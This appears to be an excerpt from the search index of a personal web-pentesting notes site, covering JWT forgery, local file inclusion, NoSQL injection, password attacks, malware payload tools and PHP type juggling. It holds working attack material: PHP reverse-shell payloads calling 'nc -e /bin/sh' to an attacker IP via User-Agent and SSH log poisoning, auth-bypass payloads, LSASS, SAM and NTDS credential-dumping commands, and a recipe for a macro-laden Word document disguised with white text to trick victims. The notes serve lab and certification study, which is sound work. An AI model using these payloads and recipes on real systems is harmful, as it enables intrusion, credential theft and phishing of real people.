<p>https://github.com/Crypto-Cat/CTF/tree/main/web/WebSecurityAcademy/jwt</p> <p>JSON web tokens (JWTs) are a standardized format for sending cryptographically signed JSON data between systems.</p> <p>The server that issues the token typically generates the signature by hashing the header and payload. In some cases, they also encrypt the resulting hash. </p> <ul> <li> <p>As the signature is directly derived from the rest of the token, changing a single byte of the header or payload results in a mismatched signature.</p> </li> <li> <p>Without knowing the server's secret signing key, it shouldn't be possible to generate the correct signature for a given header or payload.</p> </li> </ul> <p>JSON Web Signature (JWS) -  </p> <p>JSON Web Encryption (JWE) - The contents of the token are encrypted.</p>","tags":["web","pentesting","jwt"]},{"location":"webexploitation/jwt-attacks/#jwt-signature-verification-attack","title":"JWT signature verification attack","text":"","tags":["web","pentesting","jwt"]},{"location":"webexploitation/jwt-attacks/#1-server-not-verifying-the-signature","title":"1. Server not verifying the signature","text":"<p>If the server doesn't verify the signature properly, there's nothing to stop an attacker from making arbitrary changes to the rest of the token.</p> <p>For example, consider a JWT containing the following claims:</p> <p><code>{ \"username\": \"carlos\", \"isAdmin\": false }</code></p> <p>If the server identifies the session based on this\u00a0<code>username</code>, modifying its value might enable an attacker to impersonate other logged-in users. Similarly, if the\u00a0<code>isAdmin</code>\u00a0value is used for access control, this could provide a simple vector for privilege escalation.</p>","tags":["web","pentesting","jwt"]},{"location":"webexploitation/jwt-attacks/#2-accepting-arbitrary-signatures","title":"2. Accepting arbitrary signatures","text":"<p>JWT libraries typically provide one method for verifying tokens and another that just decodes them. For example, the Node.js library\u00a0<code>jsonwebtoken</code>\u00a0has\u00a0<code>verify()</code>\u00a0and\u00a0<code>decode()</code>.</p> <p>Occasionally, developers confuse these two methods and only pass incoming tokens to the\u00a0<code>decode()</code>\u00a0method. This effectively means that the application doesn't verify the signature at all.</p> <p>Payload can be changed with no limitation.</p>","tags":["web","pentesting","jwt"]},{"location":"webexploitation/jwt-attacks/#3-accepting-tokens-with-no-signature","title":"3. Accepting tokens with no signature","text":"<p>Otherwise called the \"none\" attack. JWTs can be signed using a range of different algorithms, but can also be left unsigned. In this case, the\u00a0<code>alg</code>\u00a0parameter is set to\u00a0<code>none</code>, which indicates a so-called \"unsecured JWT\".</p> <p>\"alg\" parameter can therefore be set to:</p> <pre><code>none\nNone\nNONE\nNoNE\n</code></pre> <p>Then, the attacker can be modify the payload.</p> <p>Finally, the payload part must still be terminated with a trailing dot.</p>","tags":["web","pentesting","jwt"]},{"location":"webexploitation/jwt-attacks/#4-brute-forcing-secret-keys","title":"4. Brute-forcing secret keys","text":"<p>When implementing JWT applications, developers sometimes make mistakes like forgetting to change default or placeholder secrets.</p> jwt secrets payloads <p>https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list</p> <pre><code>hashcat -a 0 -m 16500 &lt;jwt&gt; &lt;wordlist&gt;\n</code></pre> <p>If you run the command more than once, you need to include the\u00a0<code>--show</code>\u00a0flag to output the results.</p> <p>Once you have identified the secret key, you can use it to generate a valid signature. Use JWT Editor for that (tab Keys.)</p> <p>Then, send you request to Repeater. In Repeater go to JSON Web Token tab, modify the payload and click on Sign. Select your signature. </p>","tags":["web","pentesting","jwt"]},{"location":"webexploitation/jwt-attacks/#5-jwt-header-parameter-injections","title":"5. JWT header parameter injections","text":"<p>According to the JWS specification, only the\u00a0<code>alg</code>\u00a0header parameter is mandatory. In practice, however, JWT headers (also known as JOSE headers) often contain several other parameters. The following ones are of particular interest to attackers.</p> <ul> <li> <p><code>jwk</code>\u00a0(JSON Web Key) - Provides an embedded JSON object representing the key.</p> </li> <li> <p><code>jku</code>\u00a0(JSON Web Key Set URL) - Provides a URL from which servers can fetch a set of keys containing the correct key.</p> </li> <li> <p><code>kid</code>\u00a0(Key ID) - Provides an ID that servers can use to identify the correct key in cases where there are multiple keys to choose from. Depending on the format of the key, this may have a matching\u00a0<code>kid</code>\u00a0parameter.</p> </li> </ul>","tags":["web","pentesting","jwt"]},{"location":"webexploitation/jwt-attacks/#51-injecting-self-signed-jwts-via-the-jwk-parameter","title":"5.1. Injecting self-signed JWTs via the jwk parameter","text":"<p>The JSON Web Signature (JWS) specification describes an optional\u00a0<code>jwk</code>\u00a0header parameter, which servers can use to embed their public key directly within the token itself in JWK format.</p> <p>How to perform the attack with Burpsuite:</p> <pre><code>1. With the extension loaded, in Burp's main tab bar, go to the JWT Editor Keys tab.\n\n2. Generate a new RSA key.\n\n3. Send a request containing a JWT to Burp Repeater.\n\n4. In the message editor, switch to the extension-generated JSON Web Token tab and modify the token's payload however you like.\n\n5. Click Attack, then select Embedded JWK. When prompted, select your newly generated RSA key.\n\n6. Send the request to test how the server responds.\n</code></pre>","tags":["web","pentesting","jwt"]},{"location":"webexploitation/jwt-attacks/#52-injecting-self-signed-jwts-via-the-jku-parameter","title":"5.2. Injecting self-signed JWTs via the jku parameter","text":"<p>Instead of embedding public keys directly using the\u00a0<code>jwk</code>\u00a0header parameter, some servers let you use the\u00a0<code>jku</code>\u00a0(JWK Set URL) header parameter to reference a JWK Set containing the key. When verifying the signature, the server fetches the relevant key from this URL.</p> <p>A JWK Set is a JSON object containing an array of JWKs representing different keys. You can see an example of this below.</p> <pre><code>{ \"keys\": [ { \"kty\": \"RSA\", \"e\": \"AQAB\", \"kid\": \"75d0ef47-af89-47a9-9061-7c02a610d5ab\", \"n\": \"o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ\" }, { \"kty\": \"RSA\", \"e\": \"AQAB\", \"kid\": \"d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA\", \"n\": \"fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw\" } ] }`\n</code></pre> <p>JWK Sets like this are sometimes exposed publicly via a standard endpoint, such as\u00a0<code>/.well-known/jwks.json</code>.</p> <p>So a way to trick this validation is by creating our own set of RSA keys. </p> <p>Then, have a server serving these keys. </p> <p>Then, modify the payload of the JWT. </p> <p>And finally, modify the head, by adding the  <code>kdi</code>  corresponding to our crafted RSA key, and a <code>jku</code>parameter pointing to our server serving the keys. With this configuration we can use 'JWT Editor' in BurpSuite to sign the new crafted JWT. </p>","tags":["web","pentesting","jwt"]},{"location":"webexploitation/jwt-attacks/#53-injecting-self-signed-jwts-via-the-kid-parameter","title":"5.3. Injecting self-signed JWTs via the kid parameter","text":"","tags":["web","pentesting","jwt"]},{"location":"webexploitation/local-file-inclusion-lfi/","title":"LFI attack - Local File Inclusion","text":"OWASP <p>OWASP Web Security Testing Guide 4.2 &gt; 5. Authorization Testing &gt; 5.1. Testing Directory Traversal File Include</p> ID Link to Hackinglife Link to OWASP Description 5.1 WSTG-ATHZ-01 Testing Directory Traversal File Include - Identify injection points that pertain to path traversal.  - Assess bypassing techniques and identify the extent of path traversal (dot-dot-slash attack, Local/Remote file inclusion) <p>Local File Inclusion (LFI) is a type of security vulnerability that occurs when an application allows an attacker to include files on the server through the web browser. File inclusion in web applications refers to the practice of including external files, often scripts or templates, into a web page dynamically. It is a fundamental concept used to create dynamic and modular web applications.</p> <p>LFI vulnerabilities typically occur due to poor input validation or lack of proper security mechanisms in web applications. Attackers exploit these vulnerabilities by manipulating input parameters that are used to specify file paths or filenames within the application:</p> <ul> <li>File Inclusion Functions: Functions like include(), require(), or file_get_contents() that accept user-controlled input for file paths.</li> <li>HTTP Parameters: Input fields in web forms or query parameters in URLs.</li> <li>Cookies: If an application uses cookies to determine the file to include.</li> <li>Session Variables: If session data can be manipulated to control file inclusion.</li> </ul> <p>Impact:</p> <ul> <li>Information Disclosure: Attackers can read sensitive files, including configuration files, user data, and source code, exposing critical information. </li> <li>Remote Code Execution: In some cases, LFI can lead to the execution of arbitrary code if an attacker can include malicious PHP or other script files. </li> <li>Directory Traversal: LFI attacks can allow an attacker to navigate the directory structure, potentially leading to further vulnerabilities or unauthorized access.</li> </ul> <p>LFI (Local File Inclusion): The primary objective of an LFI attack is to include and display the contents of a file on the server within the context of a web application (to get it executed). </p> <p>Directory Traversal: Directory Traversal, also known as Path Traversal, focuses on navigating the file system's directory structure to access files or directories outside the intended path. While this can lead to LFI, the primary goal is often broader, encompassing the ability to read, modify, or delete files and directories.</p>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/local-file-inclusion-lfi/#interesting-files","title":"Interesting files","text":"<p>Interesting Windows files Interesting Linux files</p>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/local-file-inclusion-lfi/#procselfenviron","title":"/proc/self/environ","text":"<p>This files contain Environment variables. One of those variables might be HTTP_USER_AGENT, which is the user agent used by the client to access the server. So by using a  proxy interceptor  we could modify that header to be, let's say:</p> <pre><code>&lt;?phpinfo()&gt;\n</code></pre> <p></p> <p>When it comes to get a shell here, we need to use PHP function passthru, which is similar to the exec command:</p> <p>passthru\u00a0\u2014\u00a0Execute an external program and display raw output</p> <p>In this case, we would be adding in the user agent header the reverse shell:</p> <pre><code>&lt;?passthru(\"nc -e /bin/sh &lt;attacker IP&gt; &lt;attacker port&gt;\") ?&gt; \n</code></pre>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/local-file-inclusion-lfi/#varlogauthlog-or-varlogapache2accesslog","title":"/var/log/auth.log  or /var/log/apache2/access.log","text":"<p>If  we have the ability to read a log file, then we can see if we can write in them in a malicious way.</p> <p>For instance, with /var/log/auth.log, we can try an ssh connection and see how these attemps are recorded on the file. Then, instead of using a real username, I can set some php code:</p> <pre><code>ssh \"&lt;?passthru('nc -e /bin/sh &lt;attacker IP&gt; &lt;attacker port&gt;');?&gt;\"@$ip \n</code></pre> <p>But there might be problems with blank spaces, slashes and so on, so one thing you can do is base64 encoded your netcat command, and tell the function to decode it before executing it  </p> <pre><code># base64 encode your netcat command: nc -e /bin/sh &lt;attacker IP&gt; &lt;attacker port&gt;\nssh \"&lt;?passthru(base64_decode'&lt;base64 encoded text&gt;');?&gt;\"@$ip \n</code></pre> <p>Now just get a netcat listener in your kali attacker machine.</p>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/local-file-inclusion-lfi/#tools-and-payloads","title":"Tools and payloads","text":"<ul> <li>See updated chart: Attacks and tools for web pentesting.</li> </ul>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/nosql-injection/","title":"NoSQL injection","text":"<p>Dictionary for NoSQL injections.</p> <p>Examples of NoSQL databases: redis, mongo.</p> <p>SQL stands for Structure Query Language. NoSQL Injection is a security vulnerability that occurs in applications that utilize NoSQL databases. It is a type of attack that involves an attacker manipulating a NoSQL database query by injecting malicious input, leading to unauthorized access, data leakage, or unintended operations. In traditional SQL Injection attacks, attackers exploit vulnerabilities by inserting malicious SQL code into input fields that are concatenated with database queries. Similarly, in NoSQL Injection, attackers exploit weaknesses in the application's handling of user-supplied input to manipulate NoSQL database queries.</p> <p>How does it work a NoSQL injection? Explanation: </p> <pre><code># MongoDB query\nvar query = {\nusername: username,\npassword: password\n};\n\n# Perform query to check if credentials are valid\nvar result = db.users.findOne(query);\n\nif (result) {\n// Login successful\n} else {\n// Login failed\n</code></pre> <p>In this example, the application constructs a MongoDB query using user-supplied values for the username and password fields. If an attacker intentionally provides a specially crafted value, they could potentially exploit a NoSQL injection vulnerability. For instance, an attacker might enter the following value as the username parameter:</p> <pre><code>$gt:\"\"\n</code></pre> <p>The attacker could potentially bypass the login mechanism and gain unauthorized access.</p> <p>Typical payloads:</p> <pre><code># Payload\nusername[$ne]=1$password[$ne]=1\n# Use case/Function: Not equals to (Auth Bypass)                |\n\n# Payload\nusername[$regex]=^adm$password[$ne]=1\n# Use case/Function: Checks a regular expression (Auth Bypass)\n\n# Payload\nusername[$regex]=.{25}&amp;pass[$ne]=1\n# Use case/Function: Checks regex to find the length of a value\n\n# Payload\nusername[$eq]=admin&amp;password[$ne]=1 \n# Use case/Function: Equals to.\n\n# Payload\nusername[$ne]=admin&amp;pass[$gt]=s \n# Use case/Function: Greater than.\n</code></pre> <p>Example of a user search form: </p> <p></p> <p>With the not equal operator, it will return all users except for \"admin\".</p> <p></p>","tags":["pentesting","web","pentesting"]},{"location":"webexploitation/password-attacks/","title":"Password attacks","text":"","tags":["OSCP"]},{"location":"webexploitation/password-attacks/#connecting-to-target","title":"Connecting to Target","text":"<pre><code># CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol\nxfreerdp /v:&lt;ip&gt; /u:htb-student /p:HTB_@cademy_stdnt!\n</code></pre> <pre><code># Uses Evil-WinRM to establish a Powershell session with a target. \nevil-winrm -i &lt;ip&gt; -u user -p password\n</code></pre> <pre><code># Uses SSH to connect to a target using a specified user.\nssh user@&lt;ip&gt;\n</code></pre> <pre><code># Uses smbclient to connect to an SMB share using a specified user.\nsmbclient -U user \\\\\\\\&lt;ip&gt;\\\\SHARENAME\n</code></pre> <pre><code># Uses smbserver.py to create a share on a linux-based attack host. Can be useful when needing to transfer files from a target to an attack host.\npython3 smbserver.py -smb2support CompData /home/&lt;nameofuser&gt;/Documents/\n</code></pre>","tags":["OSCP"]},{"location":"webexploitation/password-attacks/#password-mutations","title":"Password mutations","text":"<pre><code># Uses cewl to generate a wordlist based on keywords present on a website.\ncewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist\n</code></pre> <pre><code># Uses Hashcat to generate a rule-based word list.\nhashcat --force password.list -r custom.rule --stdout &gt; mut_password.list\n</code></pre> <pre><code># Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential username. \n./username-anarchy -i /path/to/listoffirstandlastnames.txt\n</code></pre> <pre><code># Uses Linux-based commands curl, awk, grep and tee to download a list of file extensions to be used in searching for files that could contain passwords. \ncurl -s https://fileinfo.com/filetypes/compressed \\| html2text \\| awk '{print tolower($1)}' \\| grep \"\\.\" \\| tee -a compressed_ext.txt\n</code></pre>","tags":["OSCP"]},{"location":"webexploitation/password-attacks/#remote-password-attacks","title":"Remote Password Attacks","text":"<pre><code># Uses CrackMapExec over WinRM to attempt to brute force user names and passwords specified hosted on a target.\ncrackmapexec winrm &lt;ip&gt; -u user.list -p password.list\n</code></pre> <pre><code># Uses CrackMapExec to enumerate smb shares on a target using a specified set of credentials. \ncrackmapexec smb &lt;ip&gt; -u \"user\" -p \"password\" --shares\n</code></pre> <pre><code># Uses Hydra in conjunction with a user list and password list to attempt to crack a password over the specified service.\nhydra -L user.list -P password.list &lt;service&gt;://&lt;ip&gt;\n</code></pre> <pre><code># Uses Hydra in conjunction with a username and password list to attempt to crack a password over the specified service.\nhydra -l username -P password.list &lt;service&gt;://&lt;ip&gt;\n</code></pre> <pre><code># Uses Hydra in conjunction with a user list and password to attempt to crack a password over the specified service.\nhydra -L user.list -p password &lt;service&gt;://&lt;ip&gt;  \n</code></pre> <pre><code># Uses Hydra in conjunction with a list of credentials to attempt to login to a target over the specified service. This can be used to attempt a credential stuffing attack.\nhydra -C &lt;user_pass.list&gt; ssh://&lt;IP&gt;\n</code></pre> <pre><code># Uses CrackMapExec in conjunction with admin credentials to dump password hashes stored in SAM, over the network. \ncrackmapexec smb &lt;ip&gt; --local-auth -u &lt;username&gt; -p &lt;password&gt; --sam\n</code></pre> <pre><code># Uses CrackMapExec in conjunction with admin credentials to dump lsa secrets, over the network. It is possible to get clear-text credentials this way. \ncrackmapexec smb &lt;ip&gt; --local-auth -u &lt;username&gt; -p &lt;password&gt; --lsa\n</code></pre> <pre><code># Uses CrackMapExec in conjunction with admin credentials to dump hashes from the ntds file over a network. \ncrackmapexec smb &lt;ip&gt; -u &lt;username&gt; -p &lt;password&gt; --ntds\n</code></pre> <pre><code># Uses Evil-WinRM to establish a Powershell session with a Windows target using a user and password hash. This is one type of `Pass-The-Hash` attack.\nevil-winrm -i &lt;ip&gt;  -u  Administrator -H \"&lt;passwordhash&gt;\" \n</code></pre>","tags":["OSCP"]},{"location":"webexploitation/password-attacks/#windows-local-password-attacks","title":"Windows Local Password Attacks","text":"<pre><code># A command-line-based utility in Windows used to list running processes.\ntasklist /svc                        \n</code></pre> <pre><code># Uses Windows command-line based utility findstr to search for the string \"password\" in many different file type.\nfindstr /SIM /C:\"password\" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml\n</code></pre> <pre><code># A Powershell cmdlet is used to display process information. Using this with the LSASS process can be helpful when attempting to dump LSASS process memory from the command line. \nGet-Process lsass\n</code></pre> <pre><code># Uses rundll32 in Windows to create a LSASS memory dump file. This file can then be transferred to an attack box to extract credentials. \nrundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\lsass.dmp full\n</code></pre> <pre><code># Uses Pypykatz to parse and attempt to extract credentials &amp; password hashes from an LSASS process memory dump file. \npypykatz lsa minidump /path/to/lsassdumpfile\n</code></pre> <pre><code># Uses reg.exe in Windows to save a copy of a registry hive at a specified location on the file system. It can be used to make copies of any registry hive (i.e., hklm\\sam, hklm\\security, hklm\\system).\nreg.exe save hklm\\sam C:\\sam.save\n</code></pre> <pre><code># Uses move in Windows to transfer a file to a specified file share over the network. \nmove sam.save \\\\&lt;ip&gt;\\NameofFileShare\n</code></pre> <pre><code># Uses Secretsdump.py to dump password hashes from the SAM database.\npython3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL\n</code></pre> <pre><code># Uses Windows command line based tool vssadmin to create a volume shadow copy for `C:`. This can be used to make a copy of NTDS.dit safely. \nvssadmin CREATE SHADOW /For=C:\n</code></pre> <pre><code># Uses Windows command line based tool copy to create a copy of NTDS.dit for a volume shadow copy of `C:`. \ncmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\NTDS\\NTDS.dit c:\\NTDS\\NTDS.dit \n</code></pre>","tags":["OSCP"]},{"location":"webexploitation/password-attacks/#linux-local-password-attacks","title":"Linux Local Password Attacks","text":"<pre><code># Script that can be used to find .conf, .config and .cnf files on a Linux system.\nfor l in $(echo \".conf .config .cnf\");do echo -e \"\\nFile extension: \" $l; find / -name *$l 2&gt;/dev/null \\| grep -v \"lib\\|fonts\\|share\\|core\" ;done\n\n# Script that can be used to find credentials in specified file types. \nfor i in $(find / -name *.cnf 2&gt;/dev/null \\| grep -v \"doc\\|lib\");do echo -e \"\\nFile: \" $i; grep \"user\\|password\\|pass\" $i 2&gt;/dev/null \\| grep -v \"\\#\";done\n\n# Script that can be used to find common database files.\nfor l in $(echo \".sql .db .*db .db*\");do echo -e \"\\nDB File extension: \" $l; find / -name *$l 2&gt;/dev/null \\| grep -v \"doc\\|lib\\|headers\\|share\\|man\";done\n\n# Uses Linux-based find command to search for text files.\nfind /home/* -type f -name \"*.txt\" -o ! -name \"*.*\"\n\n# Script that can be used to search for common file types used with scripts. \nfor l in $(echo \".py .pyc .pl .go .jar .c .sh\");do echo -e \"\\nFile extension: \" $l; find / -name *$l 2&gt;/dev/null \\| grep -v \"doc\\|lib\\|headers\\|share\";done\n\n# Script used to look for common types of documents.\nfor ext in $(echo \".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*\");do echo -e \"\\nFile extension: \" $ext; find / -name *$ext 2&gt;/dev/null \\| grep -v \"lib\\|fonts\\|share\\|core\" ;done\n\n# Uses Linux-based cat command to view the contents of crontab in search for credentials.\ncat /etc/crontab\n\n# Uses Linux-based  ls -la command to list all files that start with `cron` contained in the etc directory. \nls -la /etc/cron.*/                             \n\n# Uses Linux-based command grep to search the file system for key terms `PRIVATE KEY` to discover SSH keys. \ngrep -rnw \"PRIVATE KEY\" /* 2&gt;/dev/null \\| grep \":1\"\n\n# Uses Linux-based grep command to search for the keywords `PRIVATE KEY` within files contained in a user's home directory. \ngrep -rnw \"PRIVATE KEY\" /home/* 2&gt;/dev/null \\| grep \":1\"\n\n# Uses Linux-based grep command to search for keywords `ssh-rsa` within files contained in a user's home directory. \ngrep -rnw \"ssh-rsa\" /home/* 2&gt;/dev/null \\| grep \":1\"\n\n# Uses Linux-based tail command to search the through bash history files and output the last 5 lines. \ntail -n5 /home/*/.bash*\n\n# Runs Mimipenguin.py using python3.\npython3 mimipenguin.py\n\n# Runs Mimipenguin.sh using bash.\nbash mimipenguin.sh                              \n\n# Runs Lazagne.py with all modules using python2.7             |\npython2.7 lazagne.py all\n\n# Uses Linux-based command to search for credentials stored by Firefox then searches for the keyword `default` using grep. \nls -l .mozilla/firefox/ \\| grep default \n\n# Uses Linux-based command cat to search for credentials stored by Firefox in JSON. \ncat .mozilla/firefox/1bplpd86.default-release/logins.json \\| jq .\n\n# Runs Firefox_decrypt.py to decrypt any encrypted credentials stored by Firefox. Program will run using python3.9. \npython3.9 firefox_decrypt.py\n\n# Runs Lazagne.py browsers module using Python 3.\npython3 lazagne.py browsers\n</code></pre>","tags":["OSCP"]},{"location":"webexploitation/password-attacks/#cracking-passwords","title":"Cracking Passwords","text":"<pre><code># Uses Hashcat to crack NTLM hashes using a specified wordlist.\nhashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt\n\n# Uses Hashcat to attempt to crack a single NTLM hash and display the results in the terminal output. \nhashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show\n\n# Uses unshadow to combine data from passwd.bak and shadow.bk into one single file to prepare for cracking. \nunshadow /tmp/passwd.bak /tmp/shadow.bak &gt; /tmp/unshadowed.hashes\n\n# Uses Hashcat in conjunction with a wordlist to crack the unshadowed hashes and outputs the cracked hashes to a file called unshadowed.cracked. \nhashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked\n\n# Uses Hashcat in conjunction with a word list to crack the md5 hashes in the md5-hashes.list file. \nhashcat -m 500 -a 0 md5-hashes.list rockyou.txt\n\n# Uses Hashcat to crack the extracted BitLocker hashes using a wordlist and outputs the cracked hashes into a file called backup.cracked. \nhashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked\n\n# Runs Ssh2john.pl script to generate hashes for the SSH keys in the SSH.private file, then redirects the hashes to a file called ssh.hash.\nssh2john.pl SSH.private &gt; ssh.hash\n\n# Uses John to attempt to crack the hashes in the ssh.hash file, then outputs the results in the terminal. \njohn ssh.hash --show\n\n# Runs Office2john.py against a protected .docx file and converts it to a hash stored in a file called protected-docx.hash. \noffice2john.py Protected.docx &gt; protected-docx.hash\n\n# Uses John in conjunction with the wordlist rockyou.txt to crack the hash protected-docx.hash. \njohn --wordlist=rockyou.txt protected-docx.hash\n\n# Runs Pdf2john.pl script to convert a pdf file to a pdf has to be cracked. \npdf2john.pl PDF.pdf &gt; pdf.hash\n\n# Runs John in conjunction with a wordlist to crack a pdf hash. \njohn --wordlist=rockyou.txt pdf.hash            \n\n# Runs Zip2john against a zip file to generate a hash, then adds that hash to a file called zip.hash. \nzip2john ZIP.zip &gt; zip.hash\n\n# Uses John in conjunction with a wordlist to crack the hashes contained in zip.hash. \njohn --wordlist=rockyou.txt zip.hash\n\n# Uses Bitlocker2john script to extract hashes from a VHD file and directs the output to a file called backup.hashes. \nbitlocker2john -i Backup.vhd &gt; backup.hashes\n\n# Uses the Linux-based file tool to gather file format information. \nfile GZIP.gzip\n\n# Script that runs a for-loop to extract files from an archive. \nfor i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2&gt;/dev/null \\| tar xz;done\n</code></pre>","tags":["OSCP"]},{"location":"webexploitation/payloads/","title":"Creating malware and custom payloads","text":"","tags":["web pentesting","dictionary","tools","payloads"]},{"location":"webexploitation/payloads/#av0id","title":"AV0id","text":"<p>AV0id.</p>","tags":["web pentesting","dictionary","tools","payloads"]},{"location":"webexploitation/payloads/#darkarmour","title":"Darkarmour","text":"<p>Darkarmour</p>","tags":["web pentesting","dictionary","tools","payloads"]},{"location":"webexploitation/payloads/#empire","title":"Empire","text":"<p>Empire cheat sheet.</p>","tags":["web pentesting","dictionary","tools","payloads"]},{"location":"webexploitation/payloads/#fatrat","title":"FatRat","text":"<p>FatRat cheat sheet.</p>","tags":["web pentesting","dictionary","tools","payloads"]},{"location":"webexploitation/payloads/#mythic-c2-framework","title":"Mythic C2 Framework","text":"<p>https://github.com/its-a-feature/Mythic The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation. A cross-platform, post-exploit, red teaming framework built with GoLang, docker, docker-compose, and a web browser UI. It's designed to provide a collaborative and user friendly interface for operators, managers, and reporting throughout red teaming.</p>","tags":["web pentesting","dictionary","tools","payloads"]},{"location":"webexploitation/payloads/#msfvenom","title":"msfvenom","text":"<p>msfvenom cheat sheet.</p>","tags":["web pentesting","dictionary","tools","payloads"]},{"location":"webexploitation/payloads/#nishang","title":"Nishang","text":"<p>nishang cheat sheet</p>","tags":["web pentesting","dictionary","tools","payloads"]},{"location":"webexploitation/payloads/#syringe","title":"Syringe","text":"<p>syringe</p>","tags":["web pentesting","dictionary","tools","payloads"]},{"location":"webexploitation/payloads/#veil","title":"Veil","text":"<p>Veil cheat sheet.</p>","tags":["web pentesting","dictionary","tools","payloads"]},{"location":"webexploitation/payloads/#creating-malware-in-pdf","title":"Creating malware in pdf","text":"<p>These two modules in metasploit:</p> <ul> <li>exploit/windows/fileformat/adobe_pdf_embedded_exe</li> <li>exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs </li> </ul>","tags":["web pentesting","dictionary","tools","payloads"]},{"location":"webexploitation/payloads/#creating-malware-in-word-document","title":"Creating malware in word document","text":"<p>1. Craft an executable</p> <p>Use for instance veil.</p> <p>2. Convert it to a VisualBasic script - macro code</p> <pre><code>locate exe2vba\n# Result: /usr/share/metasploit-framework/tools/exploit/exe2vba.rb\n\n# Go to the folder\ncd /usr/share/metasploit-framework/tools/exploit/\n\n# Create the malicious vba script\n./exe2vba.rb &lt;first-parameter&gt; path/to/nameOfOutputFile.vba\n# first parameter: malicious executable file that will be converted to macro code. Take the path to the .exe file provided by veil\n</code></pre> <p>3. Create an MS Word document</p> <p>4. Opena new macro and embed macro code</p> <p>5. Copy the payload as text in the word document. If it's too long, disguise it (set font color to white).</p> <p>6. Convince the victim to have macros enabled.</p> <p>7. Start a listener and wait for the victim to connect.</p>","tags":["web pentesting","dictionary","tools","payloads"]},{"location":"webexploitation/payloads/#creating-malware-in-a-firefox-addon","title":"Creating malware in a Firefox addon","text":"<p>Use the metasploit module to generate the addon: exploit/multi/browser/firefox_xpi_bootstrapped_addon</p> <p>It will be served from SRVHOST:SRVPORT/URIPATH. This URL you can serve it from a phishing email.</p>","tags":["web pentesting","dictionary","tools","payloads"]},{"location":"webexploitation/php-type-juggling-vulnerabilities/","title":"PHP Type Juggling Vulnerabilities","text":"<p>Read PHP Type Juggling Vulnerabilities.</p> <p>Copy-pasted, quoted:</p> <pre><code>How vulnerability arises\n\nThe most common way that this particularity in PHP is exploited is by using it to bypass authentication.\n\nLet\u2019s say the PHP code that handles authentication looks like this:\n\nif ($_POST[\"password\"] == \"Admin_Password\") {login_as_admin();}\n\nThen, simply submitting an integer input of 0 would successfully log you in as admin, since this will evaluate to True:\n\n(0 == \u201cAdmin_Password\u201d) -&gt; True\n</code></pre> <p>In the HackTheBox machine Base, login form was bypasseable by entering an empty array into the username and password parameters:</p> <pre><code>Original request\n\n\nPOST /login/login.php HTTP/1.1\nHost: base.htb\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 57\nOrigin: http://base.htb\nConnection: close\nReferer: http://base.htb/login/login.php\nCookie: PHPSESSID=sh4obp53otv54vtsj0g6tev1tt\nUpgrade-Insecure-Requests: 1\n\nusername=admin&amp;password=admin\n</code></pre> <pre><code>Crafted request:\n\nPOST /login/login.php HTTP/1.1\nHost: base.htb\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 57\nOrigin: http://base.htb\nConnection: close\nReferer: http://base.htb/login/login.php\nCookie: PHPSESSID=sh4obp53otv54vtsj0g6tev1tt\nUpgrade-Insecure-Requests: 1\n\nusername[]=admin&amp;password[]=admin\n</code></pre> <p>How to know? By spotting the file login.php.swp in the /login exposed directory and reading its contents with:</p> <pre><code>vim -r login.php.swp\n# -r  -- list swap files and exit or recover from a swap file\n</code></pre> <p>Content:</p> <pre><code>&lt;?php\nsession_start();\nif (!empty($_POST['username']) &amp;&amp; !empty($_POST['password'])) {\n    require('config.php');\n    if (strcmp($username, $_POST['username']) == 0) {\n        if (strcmp($password, $_POST['password']) == 0) {\n            $_SESSION['user_id'] = 1;\n            header(\"Location: /upload.php\");\n        } else {\n            print(\"&lt;script&gt;alert('Wrong Username or Password')&lt;/script&gt;\");\n        }\n    } else {\n        print(\"&lt;script&gt;alert('Wrong Username or Password')&lt;/script&gt;\");\n    }\n}\n</code></pre> <p>Quoting from the article PHP Type Juggling Vulnerabilities: \"When comparing values, always try to use the type-safe comparison operator <code>===</code> instead of the loose comparison operator <code>==</code>. This will ensure that PHP does not type juggle and the operation will only return True if the types of the two variables also match. This means that (7 === \u201c7\u201d) will return False.\"</p>","tags":["web pentesting"]},{"location":"webexploitation/reflected-file-download-rfd/","title":"RFD attack - Reflected File Download","text":"<p>Reflected File Download attack (RFD) combines url path segments with web services vulnerable to JSONP 